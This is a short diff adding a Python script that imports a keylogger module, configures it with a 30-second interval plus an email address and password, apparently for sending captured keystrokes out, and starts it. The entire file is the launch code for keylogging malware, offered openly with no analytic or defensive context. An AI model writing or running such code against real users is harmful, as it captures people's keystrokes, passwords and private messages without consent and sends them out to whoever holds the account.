@@ -1,0 +1,5 @@
+import keylogger
+
+my_keylogger = keylogger.Keylogger(30, "user@gmail.com", "password")
+
+my_keylogger.start()
